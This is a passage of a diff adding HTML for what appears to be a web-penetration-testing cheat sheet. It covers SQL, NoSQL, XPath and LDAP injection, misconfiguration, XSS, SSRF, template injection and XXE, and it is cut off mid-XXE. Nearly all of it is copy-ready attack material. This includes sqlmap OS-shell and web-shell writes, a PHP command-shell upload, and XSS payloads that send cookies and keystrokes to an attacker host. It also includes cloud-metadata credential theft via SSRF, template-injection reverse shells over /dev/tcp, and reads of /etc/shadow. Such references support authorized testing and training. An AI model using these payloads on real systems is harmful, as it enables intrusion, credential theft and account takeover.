+        sqlmap -r request.txt --technique=B <span class="cm"># boolean only (blind)</span>
+        sqlmap -r request.txt --technique=U <span class="cm"># UNION only</span>
+
+        <span class="cm"># File operations</span>
+        sqlmap -r request.txt --file-read=/etc/passwd
+        sqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/shell.php
+
+        <span class="cm"># OS shell</span>
+        sqlmap -r request.txt --os-shell
+
+        <span class="cm"># Tamper scripts (WAF bypass)</span>
+        sqlmap -r request.txt --tamper=space2comment,between --dbs
+        sqlmap -r request.txt --tamper=randomcase --dbs
+
+        <span class="cm"># Common tamper scripts:</span>
+        <span class="cm"># space2comment — replace spaces with /**/</span>
+        <span class="cm"># between — replace &gt; with BETWEEN</span>
+        <span class="cm"># randomcase — RaNdOmCaSe keywords</span>
+        <span class="cm"># base64encode — base64 encode</span>
+        <span class="cm"># charencode — URL encode chars</span>
+        <span class="cm"># equaltolike — = to LIKE</span>
+        <span class="cm"># greatest — &gt; to GREATEST()</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="blind-sqli-manual">Blind SQLi — Manual</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Boolean-based</span>
+        ' AND SUBSTRING(password,1,1)='a'-- <span class="cm"># first char of password is 'a'?</span>
+        ' AND ASCII(SUBSTRING(password,1,1))&gt;64-- <span class="cm"># binary search on ASCII</span>
+
+        <span class="cm"># Time-based</span>
+        ' AND SLEEP(5)-- <span class="cm"># MySQL</span>
+        ' AND IF(1=1,SLEEP(5),0)-- <span class="cm"># MySQL conditional</span>
+        '; WAITFOR DELAY '0:0:5'-- <span class="cm"># MSSQL</span>
+        ' AND 1=1; SELECT SLEEP(5)--
+
+        <span class="cm"># Out-of-band (OOB) — trigger DNS/HTTP to your server</span>
+        ' AND LOAD_FILE(CONCAT('\\\\',database(),'.burpcollaborator.net\\share'))--
+        <span class="cm"># MSSQL:</span>
+        '; EXEC master..xp_dirtree '\\$LHOST\share'--
+      </div>
+    </div>
+    <h3 class="md-h3" id="second-order-sqli">Second-Order SQLi</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Inject payload in one place (e.g. registration: username =
+          admin'--)</span>
+        <span class="cm"># Payload executes when used in a different query (e.g. profile page query)</span>
+        <span class="cm"># No immediate output — need to check later pages</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a04-nosql-other-injection" style="margin-top:36px"><span class="sec-title">A04 — NoSQL /
+        Other Injection</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="mongodb-nosql-injection">MongoDB / NoSQL Injection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Authentication bypass</span>
+        <span class="cm"># Original: {"username": "admin", "password": "pass"}</span>
+        <span class="cm"># Injected:</span>
+        {"username": {"$gt": ""}, "password": {"$gt": ""}}
+        {"username": "admin", "password": {"$ne": "wrongpassword"}}
+        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+
+        <span class="cm"># URL parameter</span>
+        ?username[$gt]=&amp;password[$gt]=
+        ?username[$regex]=.*&amp;password[$regex]=.*
+        ?username=admin&amp;password[$ne]=invalid
+
+        <span class="cm"># Array injection</span>
+        ?username[]=admin&amp;password[]=password
+
+        <span class="cm"># Data extraction (blind)</span>
+        {"username": "admin", "password": {"$regex": "^a"}} <span class="cm"># password starts with 'a'?</span>
+        {"username": "admin", "password": {"$regex": "^ab"}} <span class="cm"># password starts with 'ab'?</span>
+
+        <span class="cm"># nosqli tool</span>
+        nosqli -u "$URL/login" -p "username=admin&amp;password=FUZZ" -f /path/to/payloads.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="xpath-injection">XPath Injection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Authentication bypass</span>
+        ' or '1'='1
+        ' or ''='
+        x' or 1=1 or 'x'='y
+        ' or 1=1]%00
+
+        <span class="cm"># Data extraction</span>
+        ' or substring(//user[1]/password,1,1)='a
+        ' or string-length(//user[1]/password)=8
+
+        <span class="cm"># Automated</span>
+        xcat $URL/login username password --true="Welcome" --false="Invalid"
+      </div>
+    </div>
+    <h3 class="md-h3" id="ldap-injection">LDAP Injection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Authentication bypass</span>
+        *)(uid=*))(|(uid=* <span class="cm"># classic</span>
+        admin)(&amp;) <span class="cm"># admin with anything</span>
+        *)(objectClass=*) <span class="cm"># wildcard</span>
+
+        <span class="cm"># Example in URL</span>
+        ?user=admin)(&amp;)&amp;pass=anything
+        ?user=*)(uid=*))(|(uid=*
+
+        <span class="cm"># Data extraction</span>
+        *(|(cn=a*)) <span class="cm"># usernames starting with 'a'</span>
+
+        <span class="cm"># Automated</span>
+        python3 ldap-brute.py -u $URL -p "user=INJECT&amp;pass=test"
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a05-security-misconfiguration" style="margin-top:36px"><span class="sec-title">A05 —
+        Security Misconfiguration</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="default-credentials-admin-panels">Default Credentials & Admin Panels</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Find admin panels</span>
+        ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-admin-filenames.txt
+
+        <span class="cm"># Common paths</span>
+        /admin /administrator /admin.php /admin/login
+        /wp-admin /wp-login.php
+        /phpmyadmin /pma /phpMyAdmin
+        /manager/html (Tomcat)
+        /console (JBoss/WildFly)
+        /actuator /actuator/health /actuator/env /actuator/mappings /actuator/heapdump
+        /solr /solr/admin
+        /jenkins /jenkins/login
+        /grafana /kibana
+        /adminer.php /adminer
+
+        <span class="cm"># Default creds to try</span>
+        admin:admin | admin:password | admin:admin123
+        tomcat:tomcat | tomcat:s3cret | manager:manager
+        root:root | sa: (MSSQL)
+        pi:raspberry (Raspberry Pi)
+      </div>
+    </div>
+    <h3 class="md-h3" id="debug-info-disclosure">Debug / Info Disclosure</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Spring Boot Actuator (huge info dump)</span>
+        curl $URL/actuator
+        curl $URL/actuator/env <span class="cm"># environment variables, config</span>
+        curl $URL/actuator/heapdump <span class="cm"># heap dump → extract passwords</span>
+        curl $URL/actuator/mappings <span class="cm"># all routes</span>
+        curl $URL/actuator/beans <span class="cm"># all beans</span>
+        curl $URL/actuator/trace <span class="cm"># request traces</span>
+        curl $URL/actuator/logfile <span class="cm"># logs</span>
+
+        <span class="cm"># Parse heapdump</span>
+        java -jar heapdump_analyzer.jar heapdump
+        strings heapdump | grep -i "password\|secret\|token\|key\|api"
+
+        <span class="cm"># phpinfo() exposure</span>
+        curl $URL/phpinfo.php
+        curl $URL/info.php
+        curl $URL/php_info.php
+
+        <span class="cm"># Error messages leaking paths/stack traces</span>
+        <span class="cm"># Submit invalid data and analyze errors</span>
+
+        <span class="cm"># .DS_Store (macOS metadata)</span>
+        curl $URL/.DS_Store
+        python3 ds_store_exp.py $URL/.DS_Store
+
+        <span class="cm"># webpack / source maps</span>
+        curl $URL/static/app.js.map
+        curl $URL/bundle.js.map
+        <span class="cm"># Contains original source code</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="dangerous-http-methods">Dangerous HTTP Methods</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Check allowed methods</span>
+        curl -X OPTIONS $URL -v
+        nmap --script http-methods -p 80,443 $IP
+
+        <span class="cm"># PUT — file upload</span>
+        curl -X PUT $URL/shell.php -d '&lt;?php system($_GET["cmd"]); ?&gt;'
+
+        <span class="cm"># DELETE — delete files</span>
+        curl -X DELETE $URL/important.txt
+
+        <span class="cm"># TRACE — reflected XSS via TRACE method</span>
+        curl -X TRACE $URL -H "XSS: &lt;script&gt;alert(1)&lt;/script&gt;" -v
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a06-xss-cross-site-scripting" style="margin-top:36px"><span class="sec-title">A06 — XSS
+        (Cross-Site Scripting)</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Basic probes</span>
+        &lt;script&gt;alert(1)&lt;/script&gt;
+        &lt;img src=x onerror=alert(1)&gt;
+        &lt;svg onload=alert(1)&gt;
+        "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+        '&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+        javascript:alert(1)
+        &lt;iframe src=javascript:alert(1)&gt;
+
+        <span class="cm"># Context-aware payloads</span>
+        <span class="cm"># Inside HTML tag attribute:</span>
+        " onmouseover="alert(1)
+        ' onmouseover='alert(1)
+        " autofocus onfocus="alert(1)
+
+        <span class="cm"># Inside JavaScript string:</span>
+        ';alert(1)//
+        \';alert(1)//
+        &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+        <span class="cm"># Inside HTML comment:</span>
+        --&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+        <span class="cm"># Dalfox — automated XSS scanner</span>
+        dalfox url "$URL/search?q=test"
+        dalfox url "$URL/search?q=test" --skip-bav <span class="cm"># faster</span>
+        dalfox file urls.txt <span class="cm"># from file</span>
+
+        <span class="cm"># XSStrike</span>
+        python3 xsstrike.py -u "$URL/page?param=test"
+        python3 xsstrike.py -u "$URL/page" --data "param=test" --blind
+      </div>
+    </div>
+    <h3 class="md-h3" id="payload-variations-waf-bypass">Payload Variations (WAF bypass)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Case variation</span>
+        &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+        &lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;
+
+        <span class="cm"># Encoding</span>
+        &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+        &lt;img src=x onerror=&amp;<span
+          class="cm">#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span>
+        &lt;svg&gt;&lt;script&gt;alert&amp;lpar;1&amp;rpar;&lt;/script&gt;
+
+        <span class="cm"># No parentheses</span>
+        &lt;img src=x onerror=alert`1`&gt;
+        &lt;svg/onload=alert`1`&gt;
+
+        <span class="cm"># Double encoding</span>
+        %253Cscript%253Ealert(1)%253C/script%253E
+
+        <span class="cm"># null byte</span>
+        &lt;%00script&gt;alert(1)&lt;/%00script&gt;
+
+        <span class="cm"># Protocol variations</span>
+        &lt;a href="&amp;<span class="cm">#106;avascript:alert(1)"&gt;click&lt;/a&gt;</span>
+        &lt;a href="java&amp;<span class="cm">#0;script:alert(1)"&gt;click&lt;/a&gt;</span>
+
+        <span class="cm"># SVG payloads</span>
+        &lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;
+        &lt;svg&gt;&lt;set attributeName=onmouseover to=alert(1)&gt;&lt;/svg&gt;
+        &lt;math&gt;&lt;mstyle&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi id="a"&gt;X&lt;/mi&gt;&lt;mo id="b"
+        onmouseover="eval(id.a.textContent+id.c.textContent)"&gt;alert(1)&lt;/mo&gt;&lt;/msub&gt;&lt;mi
+        id="c"&gt;&lt;/mi&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/math&gt;
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation">Exploitation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Cookie theft — serve a collector</span>
+        python3 -m http.server 80
+        &lt;script&gt;new Image().src='http://$LHOST/?c='+document.cookie&lt;/script&gt;
+        &lt;script&gt;fetch('http://$LHOST/?c='+btoa(document.cookie))&lt;/script&gt;
+        &lt;img src="x" onerror="this.src='http://$LHOST/?c='+document.cookie"&gt;
+
+        <span class="cm"># Stored XSS → session hijack</span>
+        <span class="cm"># 1. Inject payload in stored field (comment, profile, etc.)</span>
+        <span class="cm"># 2. When admin views it, cookie is sent to you</span>
+        <span class="cm"># 3. Use cookie in Burp → access admin panel</span>
+
+        <span class="cm"># Keylogger</span>
+        &lt;script&gt;document.onkeypress=function(e){fetch('http://$LHOST/?k='+btoa(e.key))}&lt;/script&gt;
+
+        <span class="cm"># Phishing overlay</span>
+        &lt;script&gt;document.body.innerHTML='&lt;form action="http://$LHOST/steal"&gt;Username: &lt;input
+        name=u&gt;&lt;br&gt;Password: &lt;input type=password name=p&gt;&lt;br&gt;&lt;input
+        type=submit&gt;&lt;/form&gt;'&lt;/script&gt;
+
+        <span class="cm"># XSS to CSRF (steal CSRF token + perform action)</span>
+        &lt;script&gt;
+        fetch('/account/settings').then(r=&gt;r.text()).then(html=&gt;{
+        var token = html.match(/csrf_token.*?value="(.*?)"/)[1];
+        fetch('/account/delete',{method:'POST',body:'csrf_token='+token,headers:{'Content-Type':'application/x-www-form-urlencoded'}});
+        });
+        &lt;/script&gt;
+
+        <span class="cm"># DOM-based XSS sources</span>
+        document.URL / document.location / location.hash / location.search
+        document.referrer / window.name
+        localStorage / sessionStorage
+
+        <span class="cm"># DOM-based XSS sinks</span>
+        document.write() / document.writeln()
+        innerHTML / outerHTML
+        eval() / setTimeout() / setInterval()
+        location / location.href / location.replace()
+      </div>
+    </div>
+    <h3 class="md-h3" id="blind-xss">Blind XSS</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Use XSS Hunter or your own server</span>
+        <span class="cm"># Payload sends full page + cookies to your server when triggered</span>
+        &lt;script src="https://xsshunter.com/payload.js"&gt;&lt;/script&gt;
+
+        <span class="cm"># Manual blind XSS payload (collect cookies + page content)</span>
+        &lt;script&gt;
+        var x=new XMLHttpRequest();
+        x.open('GET','http://$LHOST/?cookie='+btoa(document.cookie)+'&amp;url='+btoa(document.location.href),true);
+        x.send();
+        &lt;/script&gt;
+
+        <span class="cm"># Host your payload externally for shorter injection</span>
+        &lt;script src=http://$LHOST/xss.js&gt;&lt;/script&gt;
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a07-ssrf-server-side-request-forgery" style="margin-top:36px"><span class="sec-title">A07 —
+        SSRF (Server-Side Request Forgery)</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="detection-basic-exploitation">Detection & Basic Exploitation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Identify SSRF parameters</span>
+        <span class="cm"># Look for: url=, redirect=, path=, endpoint=, image=, load=, fetch=, host=, dest=</span>
+
+        <span class="cm"># Basic test — point to your server</span>
+        curl "$URL/fetch?url=http://$LHOST/"
+        curl "$URL/image?src=http://$LHOST/"
+
+        <span class="cm"># Internal port scan via SSRF</span>
+        for port in 22 80 443 3000 3306 5432 6379 8080 8443 9200; do
+        curl -s "$URL/fetch?url=http://127.0.0.1:$port/" -m 2 &amp;&amp; echo "Port $port open"
+        done
+
+        <span class="cm"># Read internal metadata</span>
+        curl "$URL/fetch?url=http://127.0.0.1/"
+        curl "$URL/fetch?url=http://localhost/"
+        curl "$URL/fetch?url=http://[::1]/"
+        curl "$URL/fetch?url=http://0.0.0.0/"
+        curl "$URL/fetch?url=http://0/"
+
+        <span class="cm"># Cloud metadata</span>
+        curl "$URL/fetch?url=http://169.254.169.254/latest/meta-data/" <span class="cm"># AWS</span>
+        curl "$URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        curl "$URL/fetch?url=http://metadata.google.internal/computeMetadata/v1/" <span class="cm"># GCP</span>
+        curl "$URL/fetch?url=http://169.254.169.254/metadata/v1/" <span class="cm"># DigitalOcean</span>
+        curl "$URL/fetch?url=http://169.254.169.254/metadata/instance" <span class="cm"># Azure</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="ssrf-bypass-techniques">SSRF Bypass Techniques</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># IP representation bypass</span>
+        http://2130706433/ <span class="cm"># decimal of 127.0.0.1</span>
+        http://0x7f000001/ <span class="cm"># hex</span>
+        http://0177.0000.0000.0001/ <span class="cm"># octal</span>
+        http://127.1/ <span class="cm"># short form</span>
+        http://127.000.000.001/
+
+        <span class="cm"># URL scheme abuse</span>
+        file:///etc/passwd <span class="cm"># read local files</span>
+        dict://localhost:11211/stat <span class="cm"># memcached</span>
+        gopher://localhost:6379/_INFO <span class="cm"># Redis</span>
+        ftp://localhost:21/
+
+        <span class="cm"># DNS rebinding</span>
+        <span class="cm"># Register a domain that resolves to external IP, then rebinds to 127.0.0.1</span>
+
+        <span class="cm"># Redirect bypass</span>
+        <span class="cm"># Set up your server to redirect to internal address</span>
+        <span class="cm"># http://$LHOST/redirect → 302 → http://127.0.0.1:80/</span>
+
+        <span class="cm"># Unicode/encoding bypass</span>
+        http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
+        http://127.0.0.1%25.google.com/
+
+        <span class="cm"># Double URL encoding</span>
+        http://%31%32%37%2E%30%2E%30%2E%31/
+
+        <span class="cm"># Whitelisted domain bypass</span>
+        http://allowed.domain.com@127.0.0.1/
+        http://127.0.0.1<span class="cm">#allowed.domain.com</span>
+        http://allowed.domain.com.attacker.com/ <span class="cm"># if only prefix checked</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="ssrf-rce-scenarios">SSRF → RCE Scenarios</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Redis via SSRF (Gopher protocol)</span>
+        gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
+
+        <span class="cm"># SSRF to AWS metadata → credentials → further access</span>
+        curl "$URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
+        <span class="cm"># Extract: AccessKeyId, SecretAccessKey, Token</span>
+        <span class="cm"># Use with AWS CLI:</span>
+        AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 ls
+
+        <span class="cm"># SSRF → internal admin panel → account takeover</span>
+        curl "$URL/fetch?url=http://127.0.0.1:8080/admin/createUser?username=attacker&amp;role=admin"
+
+        <span class="cm"># SSRF → Elasticsearch (no auth)</span>
+        curl "$URL/fetch?url=http://127.0.0.1:9200/_cat/indices"
+        curl "$URL/fetch?url=http://127.0.0.1:9200/index/_search"
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a08-ssti-server-side-template-injection" style="margin-top:36px"><span
+        class="sec-title">A08 — SSTI (Server-Side Template Injection)</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Universal detection payloads — inject and check if expression is
+          evaluated</span>
+        {{7*7}} → 49 ? (Jinja2, Twig, Nunjucks)
+        ${7*7} → 49 ? (FreeMarker, Thymeleaf, Mako)
+        &lt;%= 7*7 %&gt; → 49 ? (ERB, EJS)
+        <span class="cm">#{7*7} → 49 ? (Ruby, Pebble)</span>
+        *{7*7} → 49 ? (Spring Expression Language)
+        ${7*'7'} → 7777777 ? (Jinja2)
+        {{7*'7'}} → 49 or 7777777 (tells Jinja2 vs Twig)
+        {7*7} → 49 ? (Smarty)
+        ${{7*7}} → 49 ? (some engines)
+
+        <span class="cm"># Tplmap — automated SSTI scanner + exploitation</span>
+        python3 tplmap.py -u "$URL/page?name=test"
+        python3 tplmap.py -u "$URL/page" --data "name=test"
+        python3 tplmap.py -u "$URL/page?name=test" --os-shell
+        python3 tplmap.py -u "$URL/page?name=test" --os-cmd "id"
+      </div>
+    </div>
+    <h3 class="md-h3" id="jinja2-python-flask-django">Jinja2 (Python — Flask, Django)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">python</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Basic RCE</span>
+        {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+        {{''.__class__.__mro__[1].__subclasses__()}}
+
+        <span class="cm"># Find index of subprocess.Popen</span>
+        {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+
+        <span class="cm"># Safer — find os module dynamically</span>
+        {% for x in ''.__class__.__mro__[1].__subclasses__() %}
+        {% if 'warning' in x.__name__ %}
+        {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
+        {% endif %}
+        {% endfor %}
+
+        <span class="cm"># config dump (Flask)</span>
+        {{config}}
+        {{config.items()}}
+
+        <span class="cm"># Globals dump</span>
+        {{self.__dict__}}
+        {{g}}
+
+        <span class="cm"># File read</span>
+        {{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+
+        <span class="cm"># Reverse shell</span>
+        {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT
+        0&gt;&amp;1"').read()}}
+      </div>
+    </div>
+    <h3 class="md-h3" id="twig-php-symfony-laravel">Twig (PHP — Symfony, Laravel)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">php</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># RCE</span>
+        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+        {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+
+        <span class="cm"># Filter-based RCE</span>
+        {{"id"|filter("system")}}
+        {{"id"|exec}}
+        {{["id"]|filter("system")}}
+
+        <span class="cm"># Reverse shell</span>
+        {{"bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'"|system}}
+      </div>
+    </div>
+    <h3 class="md-h3" id="freemarker-java">FreeMarker (Java)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">java</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">// RCE
+        &lt;<span class="cm">#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}</span>
+        ${\"freemarker.template.utility.Execute\"?new()(\"id\")}
+
+        // Read file
+        ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(',')}
+      </div>
+    </div>
+    <h3 class="md-h3" id="erb-ruby-rails">ERB (Ruby — Rails)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">ruby</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># RCE</span>
+        &lt;%= system("id") %&gt;
+        &lt;%= `id` %&gt;
+        &lt;%= IO.popen('id').read %&gt;
+
+        <span class="cm"># Reverse shell</span>
+        &lt;%= IO.popen('bash -c "bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1"').read %&gt;
+      </div>
+    </div>
+    <h3 class="md-h3" id="smarty-php">Smarty (PHP)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">php</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">{system('id')}
+        {php}echo shell_exec('id');{/php}
+        {"id"|system}</div>
+    </div>
+    <h3 class="md-h3" id="pebble-velocity-java">Pebble / Velocity (Java)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">java</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">// Pebble
+        {% set cmd = "id" %}
+        {% set exec = "java.lang.Runtime".asInstance().exec(cmd) %}
+
+        // Velocity
+        <span
+          class="cm">#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="a09-xxe-xml-external-entity" style="margin-top:36px"><span class="sec-title">A09 — XXE (XML
+        External Entity)</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="basic-xxe">Basic XXE</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">xml</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">&lt;!-- Read local file --&gt;
+        &lt;?xml version="1.0"?&gt;
+        &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+        &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+        &lt;!-- Read /etc/shadow --&gt;
+        &lt;?xml version="1.0"?&gt;
+        &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;]&gt;
+        &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+        &lt;!-- SSRF via XXE --&gt;
+        &lt;?xml version="1.0"?&gt;
+        &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://$LHOST/"&gt;]&gt;
+        &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+        &lt;!-- Read files with PHP wrapper --&gt;
+        &lt;?xml version="1.0"?&gt;
+        &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;]&gt;
+        &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>
+    </div>
+    <h3 class="md-h3" id="blind-xxe-oob-out-of-band">Blind XXE (OOB — Out-of-Band)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Set up listener first</span>
+        python3 -m http.server 80
+        <span class="cm"># Or: nc -lvnp 80</span>
+
+        <span class="cm"># DTD file on your server (xxe.dtd):</span>
+        cat &gt; xxe.dtd &lt;&lt; 'EOF'
+        &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
